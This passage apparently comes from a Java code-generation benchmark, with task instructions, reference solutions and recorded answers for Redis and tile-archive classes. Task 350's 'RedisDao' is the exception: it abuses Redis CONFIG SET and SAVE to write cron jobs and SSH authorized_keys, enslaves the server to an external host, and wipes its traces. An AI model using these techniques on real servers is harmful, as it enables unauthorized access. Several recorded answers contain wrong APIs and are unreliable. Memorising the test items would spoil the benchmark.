}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n    private final RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.asyncCommands = connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return asyncCommands.del(keys);\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return asyncCommands.hset(key, hash);\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return asyncCommands.hget(key, field);\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return asyncCommands.hgetAll(key);\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return asyncCommands.hincrby(key, field, amount);\n    }\n\n    public void closeConnection() {\n        if (connection != null && !connection.isClosed()) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Create a Java class for managing Redis cluster connections and operations using Jedis and UnifiedJedis clients.\n\nClass Description: The RedisClusterManager class provides functionality to interact with a Redis cluster, including connection management, bucket creation/initialization, and performing Redis operations. It supports both JedisCluster and UnifiedJedis interfaces for cluster operations.\n\nAttributes:\n- jedisCluster: JedisCluster - The Jedis cluster client instance for Redis operations\n- unifiedJedisCluster: UnifiedJedis - The UnifiedJedis interface for Redis cluster operations (wraps jedisCluster)\n\nMethods:\n- RedisClusterManager(List<HostAndPort> shards) -> void - Constructor that initializes the Redis cluster connection using provided shards\n- createBucket(String key) -> byte[] - Converts a string key to UTF-8 bytes for Redis operations\n- initializeBucket(byte[] key) -> void - Placeholder for bucket initialization logic using the cluster client\n- performRedisOperations(byte[] key) -> void - Placeholder for performing CRUD operations on the cluster\n- closeConnections() -> void - Properly closes all Redis cluster connections\n- createShards(String host, List<Integer> ports) -> List<HostAndPort> - Static helper method to create shard configurations from host and ports",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.UUID;\n\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\n\npublic class RedisClusterManager {\n\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(new HashSet<>(shards));\n        this.unifiedJedisCluster = this.jedisCluster;\n    }\n\n    public byte[] createBucket(String key) {\n        byte[] byteKey = key.getBytes(StandardCharsets.UTF_8);\n        return byteKey;\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Initialize bucket logic using jedisCluster\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Perform CRUD operations using jedisCluster\n    }\n\n    public void closeConnections() {\n        try {\n            if (jedisCluster != null) {\n                jedisCluster.close();\n            }\n            if (unifiedJedisCluster != null) {\n                unifiedJedisCluster.close();\n            }\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        List<HostAndPort> shards = new ArrayList<>();\n        for (Integer port : ports) {\n            shards.add(new HostAndPort(host, port));\n        }\n        return shards;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\n\nimport java.util.List;\n\npublic class RedisClusterManager {\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(shards);\n        this.unifiedJedisCluster = new UnifiedJedis(jedisCluster.getNodes());\n    }\n\n    public byte[] createBucket(String key) {\n        return key.getBytes();\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Implementation for bucket initialization logic\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Implementation for performing CRUD operations\n    }\n\n    public void closeConnections() {\n        if (jedisCluster != null) {\n            jedisCluster.close();\n        }\n        if (unifiedJedisCluster != null) {\n            unifiedJedisCluster.close();\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        List<HostAndPort> shards = new ArrayList<>();\n        for (Integer port : ports) {\n            shards.add(new HostAndPort(host, port));\n        }\n        return shards;\n    }\n}\n```"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling, resource management, and basic Redis operations.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Jedis connection pooling. It provides methods to get connections, execute commands, and properly close connections to ensure resource efficiency.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, int timeout, String password) -> void - Constructor that initializes the connection pool with specified parameters\n- getConnection() -> Jedis - Retrieves a Redis connection from the pool\n- closeConnection(Jedis jedis) -> void - Returns a connection to the pool\n- closePool() -> void - Closes the entire connection pool\n- executeCommand(String key, String value) -> void - Executes a basic Redis SET/GET operation and prints the result",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public void closePool() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Jedis jedis = getConnection()) {\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Redis operation result: \" + result);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public void closePool() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Jedis jedis = getConnection()) {\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Key: \" + key + \", Value: \" + result);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Java class that implements a writable tile archive using Java NIO's FileChannel for efficient file operations, supporting both file-based and in-memory storage options.\n\nClass Description: WriteablePmtiles is a class that provides functionality to write and manage tile archive data using Java NIO channels. It supports writing to either a physical file or an in-memory buffer, tracks bytes written, and handles proper resource cleanup.\n\nAttributes:\n- out: [SeekableByteChannel] - The channel used for writing data (either FileChannel or in-memory channel)\n- bytesWritten: [LongSupplier] - A supplier that provides the number of bytes written to the channel\n\nMethods:\n- newWriteToFile(Path path) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to a physical file at the specified path\n- newWriteToMemory(SeekableInMemoryByteChannel bytes) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to an in-memory byte channel\n- finish(TileArchiveMetadata tileArchiveMetadata) -> [void] - Finalizes the archive by writing metadata and directory information\n- bytesWritten() -> [long] - Returns the number of bytes written to the archive\n- close() -> [void] - Closes the underlying channel and releases system resources\n- DeduplicatingTileWriter.write(TileEncodingResult encodingResult) -> [void] - Inner class method that writes tile data to the channel\n- DeduplicatingTileWriter.close() -> [void] - Inner class method that performs any necessary cleanup (none in this implementation)",
    "Canonical_solution": "import com.onthegomap.planetiler.util.FileUtils;\nimport com.onthegomap.planetiler.util.SeekableInMemoryByteChannel;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.LongSupplier;\n\npublic final class WriteablePmtiles implements WriteableTileArchive {\n\n  private final SeekableByteChannel out;\n  private final LongSupplier bytesWritten;\n\n  private WriteablePmtiles(SeekableByteChannel channel, LongSupplier bytesWritten) throws IOException {\n    this.out = channel;\n    out.write(ByteBuffer.allocate(INIT_SECTION));\n    this.bytesWritten = bytesWritten;\n  }\n\n  public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n    return new WriteablePmtiles(\n      FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE),\n      () -> FileUtils.size(path)\n    );\n  }\n\n  public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) throws IOException {\n    return new WriteablePmtiles(bytes, () -> 0);\n  }\n\n  @Override\n  public void finish(TileArchiveMetadata tileArchiveMetadata) {\n    try {\n      out.write(ByteBuffer.wrap(jsonBytes));\n      out.write(ByteBuffer.wrap(directories.leaves));\n      out.position(0);\n      out.write(ByteBuffer.wrap(header.toBytes()));\n      out.write(ByteBuffer.wrap(directories.root));\n    } catch (IOException e) {\n      LOGGER.error(e.getMessage());\n    }\n  }\n\n  @Override\n  public long bytesWritten() {\n    return bytesWritten.getAsLong();\n  }\n\n  @Override\n  public void close() throws IOException {\n    out.close();\n  }\n\n  private class DeduplicatingTileWriter implements TileWriter {\n    @Override\n    public void write(TileEncodingResult encodingResult) {\n      try {\n        out.write(ByteBuffer.wrap(data));\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n      currentOffset += data.length;\n    }\n\n    @Override\n    public void close() {\n      // no cleanup needed.\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.LongSupplier;\n\npublic class WriteablePmtiles {\n    private SeekableByteChannel out;\n    private LongSupplier bytesWritten;\n\n    public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n        FileChannel channel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        return new WriteablePmtiles(channel, () -> channel.position());\n    }\n\n    public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) {\n        return new WriteablePmtiles(bytes, bytes::position);\n    }\n\n    private WriteablePmtiles(SeekableByteChannel out, LongSupplier bytesWritten) {\n        this.out = out;\n        this.bytesWritten = bytesWritten;\n    }\n\n    public void finish(TileArchiveMetadata tileArchiveMetadata) throws IOException {\n        // Implementation to write metadata and directory information\n    }\n\n    public long bytesWritten() {\n        return bytesWritten.getAsLong();\n    }\n\n    public void close() throws IOException {\n        out.close();\n    }\n\n    public void write(DeduplicatingTileWriter writer) throws IOException {\n        ByteBuffer buffer = writer.getBuffer();\n        while (buffer.hasRemaining()) {\n            out.write(buffer);\n        }\n    }\n\n    public static class DeduplicatingTileWriter {\n        private ByteBuffer buffer;\n\n        public DeduplicatingTileWriter(int bufferSize) {\n            this.buffer = ByteBuffer.allocate(bufferSize);\n        }\n\n        public ByteBuffer getBuffer() {\n            return buffer;\n        }\n\n        public void write(byte[] data) {\n            buffer.put(data);\n        }\n\n        public void close() {\n            // No-op\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Java class that provides Redis database operations including connection management, configuration changes, data persistence, and cleanup operations.\n\nClass Description: The RedisDao class encapsulates Redis operations using the Jedis client. It handles connection establishment, authentication, configuration management, data persistence, and cleanup tasks. The class supports various Redis operations including slave configuration, cron job setup, SSH key injection, and system cleanup.\n\nAttributes:\n- CONN: Jedis - Static instance of Redis connection\n- dir: List<String> - Static list storing Redis directory configuration\n- slaveReadOnlyFlag: String - Static flag for slave read-only configuration (default \"yes\")\n- ip: String - Redis server IP address\n- port: int - Redis server port number\n- password: String - Redis authentication password\n- timeout: int - Connection timeout in milliseconds\n\nMethods:\n- testConnection(): void - Tests Redis connection by creating a temporary connection, authenticating if needed, retrieving server info, and closing the connection\n- getConnection(): void - Establishes a persistent Redis connection and authenticates if required\n- closeConnection(): void - Closes the active Redis connection\n- getInfo(): void - Retrieves Redis server information and configuration directory\n- redisavedb(String dir, String dbfilename): void - Configures Redis persistence directory and filename, then triggers a save operation\n- redisslave(String vpsIp, String vpsPort): void - Configures Redis as a slave of another instance\n- crontab(String cronText): void - Attempts to create cron jobs by writing to various cron directories\n- sshkey(String sshRsa, String Path): void - Writes SSH public key to specified directory as authorized_keys\n- clean(): void - Restores original Redis configuration and cleans up temporary data",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport java.util.List;\n\npublic class RedisDao {\n    public static Jedis CONN;\n    public static List<String> dir;\n    public static String slaveReadOnlyFlag = \"yes\";\n\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, String port, String password, String timeout) {\n        this.ip = ip;\n        this.port = Integer.parseInt(port);\n        this.password = password;\n        this.timeout = Integer.parseInt(timeout) * 1000;\n    }\n\n    public void testConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n        CONN.info();\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getConnection() throws Exception {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() throws Exception {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() throws Exception {\n        String info = CONN.info();\n        dir = CONN.configGet(\"dir\");\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n    }\n\n    public void crontab(String cronText) {\n        List<String> crondirs = Arrays.asList(\"/var/spool/cron/\", \"/var/spool/cron/crontab/\", \"/var/spool/cron/crontabs/\");\n        for (String dir : crondirs) {\n            try {\n                String randomString = Utils.getRandomString();\n                CONN.set(\"xxcron\", \"\\n\\n\" + cronText + \"\\n\\n\");\n                CONN.configSet(\"dir\", dir);\n                CONN.configSet(\"dbfilename\", randomString);\n                CONN.save();\n                break;\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String Path) {\n        CONN.set(\"xxssh\", \"\\n\\n\" + sshRsa + \"\\n\\n\");\n        CONN.configSet(\"dir\", Path);\n        CONN.configSet(\"dbfilename\", \"authorized_keys\");\n        CONN.save();\n    }\n\n    public void clean() {\n        CONN.configSet(\"dir\", dir.get(1));\n        CONN.configSet(\"slave-read-only\", slaveReadOnlyFlag);\n        CONN.configSet(\"dbfilename\", \"dump.rdb\");\n        CONN.slaveofNoOne();\n        CONN.moduleUnload(\"system\");\n        CONN.del(\"xxssh\");\n        CONN.del(\"xxcron\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport java.util.List;\n\npublic class RedisDao {\n    private static Jedis CONN = null;\n    private static List<String> dir = null;\n    private static String slaveReadOnlyFlag = \"yes\";\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public void testConnection() {\n        try (Jedis jedis = new Jedis(ip, port, timeout)) {\n            if (password != null) {\n                jedis.auth(password);\n            }\n            System.out.println(jedis.info());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void getConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password != null) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() {\n        if (CONN != null) {\n            System.out.println(CONN.info());\n        }\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        if (CONN != null) {\n            CONN.configSet(\"dir\", dir);\n            CONN.configSet(\"dbfilename\", dbfilename);\n            CONN.save();\n        }\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        if (CONN != null) {\n            CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n        }\n    }\n\n    public void crontab(String cronText) {\n        // Implementation depends on operating system and requires appropriate permissions\n    }\n\n    public void sshkey(String sshRsa, String path) {\n        // Implementation depends on operating system and requires appropriate permissions\n    }\n\n    public void clean() {\n        if (CONN != null) {\n            CONN.resetConfig();\n        }\n        // Additional cleanup logic can be added here\n    }\n}\n```"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, allowing read operations to prefer the master node while maintaining failover capabilities.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave cluster, manage the connection, and properly clean up resources when done. It uses Lettuce's MasterReplica API for high availability support.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance used for connection management\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to the Redis master-slave cluster\n\nMethods:\n- RedisMasterSlaveConnector() -> void - Constructor that initializes the RedisClient instance\n- connect(List<RedisURI> nodes) -> void - Establishes a connection to the Redis master-slave cluster using the provided node URIs and configures read preference\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- close() -> void - Properly closes the connection and shuts down the Redis client to release resources",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        this.connection = MasterReplica.connect(redisClient, StringCodec.UTF8, nodes);\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.cluster.api.sync.RedisAdvancedClusterCommands;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        RedisClusterClient clusterClient = RedisClusterClient.create(nodes);\n        clusterClient.setOptions(ClusterClientOptions.builder().build());\n        this.connection = clusterClient.connect(RedisCommands.class);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (this.connection != null) {\n            this.connection.close();\n        }\n        if (this.redisClient != null) {\n            this.redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Lettuce client, supporting batch operations with asynchronous command execution.\n\nClass Description: The RedisConnectionManager class provides a way to establish, manage, and close Redis connections using Lettuce client. It supports binary data operations through ByteArrayCodec and maintains a batch of asynchronous commands for execution.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte arrays as key/value format\n- BATCH_SIZE: int (static final) - Constant defining the maximum number of commands in a batch\n- commands: CompletableFuture[] - Array to store asynchronous command futures for batch operations\n\nMethods:\n- setupConnection(): void - Initializes the Redis client and establishes a connection using test settings (host and port from TestSettings)\n- getConnection(): StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection\n- closeConnection(): void - Properly closes the Redis connection and shuts down the client\n- getCommandFutures(): CompletableFuture[] - Returns the array of command futures for batch operations\n- getBatchSize(): int - Returns the constant batch size value",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private static final int BATCH_SIZE = 20;\n    private CompletableFuture[] commands;\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n        commands = new CompletableFuture[BATCH_SIZE];\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisConnectionManager {\n    private static final int BATCH_SIZE = 100;\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n    private CompletableFuture<?>[] commands;\n\n    public void setupConnection() {\n        redisClient = RedisClient.create(\"redis://\" + TestSettings.HOST + \":\" + TestSettings.PORT);\n        connection = redisClient.connect(new ByteArrayCodec());\n        commands = new CompletableFuture[BATCH_SIZE];\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public CompletableFuture<?>[] getCommandFutures() {\n        return commands;\n    }\n\n    public int getBatchSize() {\n        return BATCH_SIZE;\n    }\n}\n```"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Create a Java class that manages Redis connections and operations using the Jedis client library, providing connection pooling and basic CRUD functionality.\n\nClass Description: RedisConnectionManager is a utility class that handles Redis connection management, authentication, and basic operations. It uses JedisPooled for connection pooling and provides thread-safe access to Redis resources.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection manager\n- poolConfig: GenericObjectPoolConfig<Connection> - Configuration for the connection pool\n\nMethods:\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) -> void - Constructor that initializes the connection with host/port and client configuration\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) -> void - Constructor with additional pool configuration\n- getConnection() -> Connection - Gets a connection from the pool\n- closeConnection(Connection connection) -> void - Returns a connection to the pool\n- setCredentialsProvider(RedisCredentialsProvider credentialsProvider) -> void - Updates the authentication credentials\n- executeCommand(String key, String value) -> void - Executes a SET command\n- getValue(String key) -> String - Executes a GET command and returns the value\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.RedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentials;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig);\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, \n                                GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig, poolConfig);\n    }\n\n    public Connection getConnection() throws JedisException {\n        return jedisPool.getPool().getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n            .credentialsProvider(credentialsProvider)\n            .build();\n        this.jedisPool = new JedisPooled(jedisPool.getPool().getAddress(), clientConfig);\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.SET, key, value);\n            String response = connection.getStatusCodeReply();\n            if (!\"OK\".equals(response)) {\n                throw new JedisException(\"Failed to set key: \" + key);\n            }\n        }\n    }\n\n    public String getValue(String key) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.GET, key);\n            return connection.getBulkReply();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.params.SetParams;\nimport redis.clients.util.Pool;\n\npublic class RedisConnectionManager {\n    private Pool<Jedis> jedisPool;\n    private JedisPoolConfig poolConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this(hostAndPort, clientConfig, new JedisPoolConfig());\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, JedisPoolConfig poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPool(poolConfig, hostAndPort.getHost(), hostAndPort.getPort(), 2000, clientConfig.getPassword());\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        // Assuming RedisCredentialsProvider sets the password\n        this.jedisPool.getConfig().setPassword(credentialsProvider.getCredentials().getPassword());\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            jedis.set(key, value);\n        }\n    }\n\n    public String getValue(String key) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            return jedis.get(key);\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis using Unix domain sockets, perform basic Redis operations, and manage connection lifecycle.\n\nClass Description: The RedisSocketConnector class enables interaction with Redis server through Unix domain sockets. It handles connection establishment, basic key-value operations, and proper resource cleanup. The class also includes utility methods for Redis URI creation and socket support detection.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used for connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- connect(RedisURI redisURI) -> void - Establishes a connection to Redis using the provided URI\n- performRedisAction(String key, String value) -> void - Performs a set and get operation on the specified key-value pair\n- close() -> void - Closes the Redis connection and shuts down the client\n- createSocketRedisUri(String socketPath) -> RedisURI - Creates a Redis URI for socket connection from the given path\n- isSupported() -> boolean - Checks if domain sockets are supported on the current system",
